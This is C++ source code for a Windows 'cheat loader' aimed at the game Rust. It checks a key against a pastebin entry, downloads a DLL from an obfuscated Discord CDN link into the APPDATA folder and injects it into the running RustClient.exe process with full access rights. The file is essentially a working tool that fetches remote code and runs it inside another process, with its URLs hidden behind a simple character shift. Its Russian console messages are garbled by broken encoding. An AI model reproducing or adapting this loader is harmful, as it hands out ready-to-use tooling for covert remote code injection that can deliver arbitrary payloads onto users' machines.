#define _CRT_SECURE_NO_WARNINGS
#include "isConnect.h"

bool checkinternet;
HANDLE hProc;
HRESULT result;
string key;

string bussdown = decrip("kwwsv://fgq.glvfrugdss.frp/dwwdfkphqwv/824197050706427935/826765459403178014/gduzlq.goo");
string query = decrip("kwwsv://sdvwhelq.frp/udz/785f5NNl");
string appdata = getenv(dchar("APPDATA"));

string replaceAll(string subject, const string& search, const string& replace) {
    size_t pos = 0;
    while ((pos = subject.find(search, pos)) != string::npos) {
        subject.replace(pos, search.length(), replace);
        pos += replace.length();
    }
    return subject;
}
string DownloadString(string URL) {
    HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
    HINTERNET urlFile;
    string rtn;
    if (interwebs) {
        urlFile = InternetOpenUrlA(interwebs, URL.c_str(), NULL, NULL, NULL, NULL);
        if (urlFile) {
            char buffer[2000];
            DWORD bytesRead;
            do {
                InternetReadFile(urlFile, buffer, 2000, &bytesRead);
                rtn.append(buffer, bytesRead);
                memset(buffer, 0, 2000);
            } while (bytesRead);
            InternetCloseHandle(interwebs);
            InternetCloseHandle(urlFile);
            string p = replaceAll(rtn, "|n", "\r\n");
            return p;
        }
    }
    InternetCloseHandle(interwebs);
    string p = replaceAll(rtn, "|n", "\r\n");
    return p;
}

int main() {
    setlocale(LC_ALL, dchar("Russian"));
    SetConsoleTitle(decrip("Dduzlq Ckhdw Lrdghu").c_str());

#ifdef DEBUG
    string test = encrip("");
    cout << test;
    _getch();
#endif


    Sleep(500);
    cout << dchar("\n\n ��������� ���������� � ��������...") << endl;
    Sleep(1200);
    system("cls");

    // ��������� ����������� � �������
    checkinternet = InternetCheckConnection(decrip("kwwsv://jrrjoh.frp/").c_str(), FLAG_ICC_FORCE_CONNECTION, 0);
    if (!checkinternet) {
        cout << dchar("\n\n �� �� ������ ��������� � ��������. ��������� ���������� � ����������") << endl;
        Sleep(1500);
        exit(-1);
    }

    // ���� ��� ������� ������ ��������������
    cout << dchar("\n\n ������� ��� ����: ");
    cin >> key;
    encrip(key);
    system("cls");

    // ��������� ����������� ������������
    cout << "\n\n ��������� ����������� � ���� ������...";
    Sleep(1400);
    system("cls");

    if (decrip(key) != DownloadString(query)) {

        cout << dchar("\n\n ���� ������������ ���� �� ��� ���������") << endl;
        Sleep(2000);
        exit(-1);

    }

    cout << dchar("\n\n �������� ������� ������������, ��������� ������ � �������") << endl;
    Sleep(1300);

    // ��������� ��� ��� � �����

    appdata += dchar("\\darwin.dll");
    DeleteUrlCacheEntry(bussdown.c_str());
    result = URLDownloadToFile(0, bussdown.c_str(), appdata.c_str(), 0, 0);
    if (result != S_OK) {
        cout << dchar("\n �� ������� ����������� � ������� ������� \n");
        Sleep(2600);
        exit(-1);
    }

    // �������� ��� � ����

    system("cls");
    cout << dchar("\n\n ������ ������� ���������, ��������� ������� ���� RustClient.exe");
    Sleep(1900);

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (_stricmp(entry.szExeFile, dchar("RustClient.exe")) == 0)
            {
                hProc = OpenProcess(PROCESS_ALL_ACCESS, TRUE, entry.th32ProcessID);
            }
        }
    }
    
    if (!hProc || hProc == 0) {
        system("cls");
        cout << dchar("\n\n [-] ��� �� ������� �������� ������� ����. ��������� ����!");
        Sleep(1900);
        exit(-1);
    }

    if (Inject(appdata.c_str(), hProc))
    {
        system("cls");
        cout << dchar("n\n [-] ������ �� ������. ���������� � ������������!");
    }

    system("cls");
    cout << dchar("\n\n [+] ��� ������� ������������, �������� ��� ����!");
    Beep(500, 500);
    Beep(600, 600);
    Beep(700, 700);
    Sleep(1800);

    return 0;
}